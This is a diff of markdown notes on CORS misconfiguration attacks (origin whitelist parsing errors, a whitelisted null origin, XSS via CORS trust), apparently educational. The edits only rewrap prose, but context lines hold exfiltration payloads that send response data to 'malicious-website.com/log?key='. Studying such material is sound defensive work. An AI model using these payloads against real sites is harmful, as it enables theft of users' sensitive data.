@@ -58,7 +58,9 @@ location='//malicious-website.com/log?key='+this.responseText;
 ````
 ### Errors parsing Origin headers
 ````
-Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. For example, the application receives a normal request like:
+Some applications that support access from multiple origins do so by using a whitelist of allowed origins. 
+When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted. 
+For example, the application receives a normal request like:
 
 GET /data HTTP/1.1
 Host: normal-website.com
@@ -71,7 +73,9 @@ HTTP/1.1 200 OK
 ...
 Access-Control-Allow-Origin: https://innocent-website.com
 
-Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
+Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. 
+These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. 
+Any mistakes in the implementation can lead to access being granted to unintended external domains.
 
 For example, suppose an application grants access to all domains ending in:
 
@@ -97,7 +101,8 @@ Cross-site redirects.
 Requests from serialized data.
 Request using the file: protocol.
 Sandboxed cross-origin requests.
-Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-domain request:
+Some applications might whitelist the null origin to support local development of the application. 
+For example, suppose an application receives the following cross-domain request:
 
 GET /sensitive-victim-data
 Host: vulnerable-website.com
@@ -109,7 +114,9 @@ HTTP/1.1 200 OK
 Access-Control-Allow-Origin: null
 Access-Control-Allow-Credentials: true
 
-In this situation, an attacker can use various tricks to generate a cross-domain request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:
+In this situation, an attacker can use various tricks to generate a cross-domain request containing the value null in the Origin header. 
+This will satisfy the whitelist, leading to cross-domain access. 
+For example, this can be done using a sandboxed iframe cross-origin request of the form:
 
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
@@ -125,7 +132,8 @@ location='malicious-website.com/log?key='+this.responseText;
 ````
 ### Exploiting XSS via CORS trust relationships
 ````
-Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
+Even "correctly" configured CORS establishes a trust relationship between two origins. 
+If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
 
 Given the following request:
 
